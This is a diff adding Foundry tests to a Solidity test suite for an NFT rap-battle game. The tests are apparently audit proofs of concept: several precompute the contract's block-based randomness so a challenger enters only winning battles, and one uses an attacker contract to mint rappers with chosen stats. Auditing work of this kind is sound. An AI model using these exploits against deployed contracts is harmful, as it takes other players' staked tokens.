@@ -8,6 +8,8 @@ import {Streets} from "../src/Streets.sol";
 import {Credibility} from "../src/CredToken.sol";
 import {IOneShot} from "../src/interfaces/IOneShot.sol";
 
+import {AttackerContract} from "./AttackerContract.sol";
+
 contract RapBattleTest is Test {
     RapBattle rapBattle;
     OneShot oneShot;
@@ -138,9 +140,23 @@ contract RapBattleTest is Test {
         oneShot.approve(address(streets), 0);
         streets.stake(0);
         vm.stopPrank();
+
+        uint256 debut = block.timestamp;
+        console.log("debut", debut);
+
         vm.warp(4 days + 1);
+
+        uint256 fin = block.timestamp;
+
+        console.log("fin", fin);
+
+        console.log("debut", (fin - debut) / 1 days);
+
+        //vm.warp(4 days + 1);
+
         vm.startPrank(user);
         streets.unstake(0);
+        vm.stopPrank();
 
         stats = oneShot.getRapperStats(0);
         assert(stats.weakKnees == false);
@@ -259,4 +275,317 @@ contract RapBattleTest is Test {
                 == bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))
         );
     }
+
+    // test to get an id that does not exist
+    function testGetRapperStatsForNonExistentToken() public {
+        vm.expectRevert();
+        OneShot.RapperStats memory metadata = oneShot.getRapperStats(10);
+    }
+
+    //test if the challenger can manipulate the NRG to win
+    function testGoOnBattleOnlyUserWin() public mintRapper {
+        address user2 = makeAddr("User2");
+        vm.prank(user2);
+        oneShot.mintRapper();
+
+        vm.startPrank(user);
+        oneShot.approve(address(streets), 0);
+        streets.stake(0);
+        vm.stopPrank();
+
+        vm.startPrank(user2);
+        oneShot.approve(address(streets), 1);
+        streets.stake(1);
+        vm.stopPrank();
+
+        vm.warp(4 days + 1);
+
+        vm.startPrank(user);
+        streets.unstake(0);
+        vm.stopPrank();
+
+        vm.startPrank(user2);
+        streets.unstake(1);
+        vm.stopPrank();
+
+        //check the balance of all 2 users after 4 days stake
+        assert(cred.balanceOf(address(user)) == 4);
+        assert(cred.balanceOf(address(user2)) == 4);
+
+        // user go on battle as defender
+        vm.startPrank(user);
+        oneShot.approve(address(rapBattle), 0);
+        cred.approve(address(rapBattle), 3);
+        rapBattle.goOnStageOrBattle(0, 3);
+        vm.stopPrank();
+
+        // user2 manipulate NRG to onyl go on battle if he win
+
+        bool win = false;
+
+        while (!win) {
+            uint256 defenderRapperSkill = rapBattle.getRapperSkill(0);
+            uint256 challengerRapperSkill = rapBattle.getRapperSkill(1);
+            uint256 totalBattleSkill = defenderRapperSkill + challengerRapperSkill;
+
+            uint256 random =
+                uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, user2))) % totalBattleSkill;
+
+            win = random > defenderRapperSkill ? true : false;
+
+            vm.warp(111 seconds);
+            vm.roll(block.number + 1);
+
+            if (win) {
+                vm.startPrank(user2);
+                oneShot.approve(address(rapBattle), 1);
+                cred.approve(address(rapBattle), 3);
+                rapBattle.goOnStageOrBattle(1, 3);
+                vm.stopPrank();
+            } else {
+                console.log("#####  user loose and decide to not go on battle");
+            }
+        }
+
+        //check the owner of NFT 0
+        assertEq(oneShot.ownerOf(0), address(user), "Owner of NFT 0 is not user");
+        assertEq(oneShot.ownerOf(1), address(user2), "Owner of NFT 1 is not user2");
+
+        //chek the balance
+        assertEq(cred.balanceOf(address(user2)), 7, "User2 balance is not 7");
+    }
+
+    //test if defender go on battle and win , that he ger his reward
+    function testGoOnBattleOnlyDefenderWin() public mintRapper {
+        address user2 = makeAddr("User2");
+        vm.prank(user2);
+        oneShot.mintRapper();
+
+        address user3 = makeAddr("User3");
+        vm.prank(user3);
+        oneShot.mintRapper();
+
+        vm.startPrank(user);
+        oneShot.approve(address(streets), 0);
+        streets.stake(0);
+        vm.stopPrank();
+
+        vm.startPrank(user2);
+        oneShot.approve(address(streets), 1);
+        streets.stake(1);
+        vm.stopPrank();
+
+        vm.startPrank(user3);
+        oneShot.approve(address(streets), 2);
+        streets.stake(2);
+        vm.stopPrank();
+
+        vm.warp(4 days + 1);
+
+        vm.startPrank(user);
+        streets.unstake(0);
+        vm.stopPrank();
+
+        vm.startPrank(user2);
+        streets.unstake(1);
+        vm.stopPrank();
+
+        vm.startPrank(user3);
+        streets.unstake(2);
+        vm.stopPrank();
+
+        //check the balance of all 3 users
+        assert(cred.balanceOf(address(user)) == 4);
+        assert(cred.balanceOf(address(user2)) == 4);
+        assert(cred.balanceOf(address(user3)) == 4);
+
+        // use go on battle
+        vm.startPrank(user);
+        oneShot.approve(address(rapBattle), 0);
+        cred.approve(address(rapBattle), 3);
+        vm.stopPrank();
+
+        vm.startPrank(user3);
+        oneShot.approve(address(rapBattle), 2);
+        cred.approve(address(rapBattle), 3);
+        vm.stopPrank();
+
+        //user go on battle
+        vm.startPrank(user);
+        rapBattle.goOnStageOrBattle(0, 3);
+
+        vm.startPrank(user2);
+        oneShot.approve(address(rapBattle), 1);
+        cred.approve(address(rapBattle), 3);
+        rapBattle.goOnStageOrBattle(1, 3);
+        vm.stopPrank();
+
+        //check the balance of user is 7
+        assert(cred.balanceOf(address(user)) == 7);
+    }
+
+    //test if user can crate a NFT with good stats;
+    function testMintRapperWithGoodStats() public {
+        vm.prank(user);
+        AttackerContract attacker = new AttackerContract(address(oneShot));
+
+        vm.prank(user);
+        attacker.attack();
+
+        console.log("Owner of NFT 0 is ", oneShot.ownerOf(0));
+        console.log("Owner of NFT 0 is ", oneShot.ownerOf(1));
+        console.log("Owner of NFT 0 is ", oneShot.ownerOf(2));
+
+        //show nexid
+        console.log("Next id is ", oneShot.getNextTokenId());
+
+        stats = oneShot.getRapperStats(1);
+        assert(stats.weakKnees == true);
+        assert(stats.heavyArms == true);
+        assert(stats.spaghettiSweater == true);
+        assert(stats.calmAndReady == false);
+        assert(stats.battlesWon == 0);
+    }
+
+    function testGoOnBattleAndUpdateWinStats() public mintRapper {
+        address user2 = makeAddr("User2");
+        vm.prank(user2);
+        oneShot.mintRapper();
+
+        vm.startPrank(user);
+        oneShot.approve(address(streets), 0);
+        streets.stake(0);
+        vm.stopPrank();
+
+        vm.startPrank(user2);
+        oneShot.approve(address(streets), 1);
+        streets.stake(1);
+        vm.stopPrank();
+
+        vm.warp(4 days + 1);
+
+        vm.startPrank(user);
+        streets.unstake(0);
+        vm.stopPrank();
+
+        vm.startPrank(user2);
+        streets.unstake(1);
+        vm.stopPrank();
+
+        //check the balance of all 2 users after 4 days stake
+        assert(cred.balanceOf(address(user)) == 4);
+        assert(cred.balanceOf(address(user2)) == 4);
+
+        // user go on battle as defender
+        vm.startPrank(user);
+        oneShot.approve(address(rapBattle), 0);
+        cred.approve(address(rapBattle), 3);
+        rapBattle.goOnStageOrBattle(0, 3);
+        vm.stopPrank();
+
+        // user2 manipulate NRG to onyl go on battle if he win
+
+        bool win = false;
+
+        while (!win) {
+            uint256 defenderRapperSkill = rapBattle.getRapperSkill(0);
+            uint256 challengerRapperSkill = rapBattle.getRapperSkill(1);
+            uint256 totalBattleSkill = defenderRapperSkill + challengerRapperSkill;
+
+            uint256 random =
+                uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, user2))) % totalBattleSkill;
+
+            win = random > defenderRapperSkill ? true : false;
+
+            vm.warp(111 seconds);
+            vm.roll(block.number + 1);
+
+            if (win) {
+                vm.startPrank(user2);
+                oneShot.approve(address(rapBattle), 1);
+                cred.approve(address(rapBattle), 3);
+                rapBattle.goOnStageOrBattle(1, 3);
+                vm.stopPrank();
+            } else {
+                console.log("#####  user loose and decide to not go on battle");
+            }
+        }
+
+        //check the owner of NFT 0
+        assertEq(oneShot.ownerOf(0), address(user), "Owner of NFT 0 is not user");
+        assertEq(oneShot.ownerOf(1), address(user2), "Owner of NFT 1 is not user2");
+
+        //chek the balance
+        assertEq(cred.balanceOf(address(user2)), 7, "User2 balance is not 7");
+
+        //check that the Stat of use2 is updated
+        stats = oneShot.getRapperStats(1);
+        assertEq(stats.battlesWon, 1, "User2 battlesWon is not 1");
+    }
+
+    //test if the user could win reward without having cred token
+    function testGoOnBattleWithZeroCredToken() public mintRapper {
+        address user2 = makeAddr("User2");
+        deal(address(cred), user2, 3);
+
+        vm.startPrank(user);
+        oneShot.approve(address(streets), 0);
+        streets.stake(0);
+        vm.stopPrank();
+
+        
+
+        vm.warp(4 days + 1);
+
+        vm.startPrank(user);
+        streets.unstake(0);
+        vm.stopPrank();
+
+        //cuser have 4 cred token and user2 have nothing
+        assert(cred.balanceOf(address(user)) == 4);
+        assert(cred.balanceOf(address(user2)) == 3);
+
+        // user go on battle as defender
+        vm.startPrank(user);
+        oneShot.approve(address(rapBattle), 0);
+        cred.approve(address(rapBattle), 3);
+        rapBattle.goOnStageOrBattle(0, 3);
+        vm.stopPrank();
+
+        // user2 manipulate NRG to onyl go on battle if he win
+
+        bool win = false;
+
+        while (!win) {
+            uint256 defenderRapperSkill = rapBattle.getRapperSkill(0);
+            uint256 challengerRapperSkill = rapBattle.getRapperSkill(1);
+            uint256 totalBattleSkill = defenderRapperSkill + challengerRapperSkill;
+
+            uint256 random =
+                uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, user2))) % totalBattleSkill;
+
+            win = random > defenderRapperSkill ? true : false;
+
+            vm.warp(111 seconds);
+            vm.roll(block.number + 1);
+
+            if (win) {
+                vm.startPrank(user2);
+                cred.approve(address(rapBattle), 3);
+                rapBattle.goOnStageOrBattle(0, 3);
+                vm.stopPrank();
+            } else {
+                console.log("#####  user loose and decide to not go on battle");
+            }
+        }
+
+        //check the owner of NFT 0
+        assertEq(oneShot.ownerOf(0), address(user), "Owner of NFT 0 is not user");
+        //assertEq(oneShot.ownerOf(1), address(user2), "Owner of NFT 1 is not user2");
+
+        //chek the balance the user should not get reward but he get 3 tokens as reward
+        assertEq(cred.balanceOf(address(user2)), 3, "User2 balance is not 3");
+    }
+
+
 }
